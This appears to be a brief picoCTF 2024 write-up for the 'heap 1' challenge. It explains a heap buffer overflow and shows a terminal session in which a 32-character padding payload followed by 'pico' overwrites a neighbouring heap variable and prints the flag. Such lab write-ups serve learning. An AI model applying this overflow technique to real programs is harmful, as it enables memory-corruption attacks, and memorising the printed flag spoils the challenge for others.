Similar to the head 0 challenge the only difference is you need to overflow the buffer to get "pico" in the correct spot.  Both `input_date` and `safe_var` are off by one address and a address is 32 bits.  Enter a payload of 32 characters then put "pico" at the end.

```
┌──(localadmin㉿WsKali)-[~/Documents/picoCTF2024/heap_1]
└─$ nc tethys.picoctf.net 63174

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x55729b3ad2b0  ->   pico
+-------------+----------------+
[*]   0x55729b3ad2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: 12345123451234512345123451234512pico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x55729b3ad2b0  ->   12345123451234512345123451234512pico
+-------------+----------------+
[*]   0x55729b3ad2d0  ->   pico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_b9064d7c}
                                                                                                                    
┌──(localadmin㉿WsKali)-[~/Documents/picoCTF2024/heap_1]
└─$ 
```